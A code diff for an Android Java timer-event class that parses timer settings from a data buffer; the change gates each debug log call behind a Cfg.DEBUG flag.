@@ -12,7 +12,7 @@ import java.util.Date;
 
 import android.util.Log;
 
-import com.android.service.Debug;
+import com.android.service.auto.Cfg;
 import com.android.service.util.DataBuffer;
 
 // TODO: Auto-generated Javadoc
@@ -48,7 +48,7 @@ public class EventTimer extends EventBase {
 	 * Instantiates a new timer event.
 	 */
 	public EventTimer() {
-		Log.d("QZ", TAG + " TimerEvent constructor");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " TimerEvent constructor");
 		
 	}
 
@@ -70,9 +70,9 @@ public class EventTimer extends EventBase {
 			type = databuffer.readInt();
 			loDelay = databuffer.readInt();
 			hiDelay = databuffer.readInt();
-			Log.d("QZ", TAG + " type: " + type + " lo:" + loDelay + " hi:" + hiDelay);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " type: " + type + " lo:" + loDelay + " hi:" + hiDelay);
 		} catch (final IOException e) {
-			Log.d("QZ", TAG + " Error: params FAILED");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: params FAILED");
 			return false;
 		}
 		return true;
@@ -89,13 +89,13 @@ public class EventTimer extends EventBase {
 
 		switch (type) {
 			case CONF_TIMER_SINGLE:
-				Log.d("QZ", TAG + " Info: TIMER_SINGLE delay: " + loDelay);
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: TIMER_SINGLE delay: " + loDelay);
 				setDelay(loDelay);
 				setPeriod(NEVER);
 				break;
 				
 			case CONF_TIMER_REPEAT:
-				Log.d("QZ", TAG + " Info: TIMER_REPEAT period: " + loDelay);
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: TIMER_REPEAT period: " + loDelay);
 				// TODO: decidere se lasciarlo a 1000 o a loDelay
 				setDelay(loDelay);
 				setPeriod(loDelay);
@@ -105,7 +105,7 @@ public class EventTimer extends EventBase {
 				long tmpTime = hiDelay << 32;
 				tmpTime += loDelay;
 				final Date date = new Date(tmpTime);
-				Log.d("QZ", TAG + " Info: TIMER_DATE: " + date);
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: TIMER_DATE: " + date);
 				setPeriod(NEVER);
 				setDelay(tmpTime - now);
 				break;
@@ -128,7 +128,7 @@ public class EventTimer extends EventBase {
 			 * (delay > 0) { setDelay(timeInst + deltaTime - now); } else { //
 			 * 
 			 * DEBUG date = new Date(timeInst + deltaTime - now);
-			 * Log.d("QZ", TAG + " Info: DELTA_DATE: " + date);
+			 * if(AutoConfig.DEBUG) Log.d("QZ", TAG + " Info: DELTA_DATE: " + date);
 			 * 
 			 * } catch (final IOException e) {
 			 * 
@@ -136,7 +136,7 @@ public class EventTimer extends EventBase {
 			 * break;
 			 */
 			default:
-				Log.d("QZ", TAG + " Error: shouldn't be here");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: shouldn't be here");
 				break;
 		}
 	}
@@ -148,7 +148,7 @@ public class EventTimer extends EventBase {
 	 */
 	@Override
 	public void go() {
-		Log.d("QZ", TAG + " Info: " + "triggering");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: " + "triggering");
 		trigger();
 	}
 
